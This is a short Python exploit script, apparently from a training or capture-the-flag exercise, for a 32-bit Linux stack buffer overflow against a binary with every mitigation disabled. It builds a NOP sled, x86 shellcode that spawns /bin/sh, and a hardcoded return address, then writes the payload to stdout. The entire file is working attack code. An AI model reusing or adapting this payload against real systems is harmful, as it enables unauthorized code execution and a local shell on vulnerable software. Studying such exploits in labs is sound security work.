#!/usr/bin/env python3
# Linux Buffer Overflow 32 bits All disabled

# Checksec

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

# /proc/sys/kernel/randomize_va_space 0

import sys

offset = 362
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nop = b"\x90" * (offset - len(shellcode))
EIP = b"\x54\xf7\xff\xbf"

payload = nop + shellcode + EIP

#print(payload)
sys.stdout.buffer.write(payload)
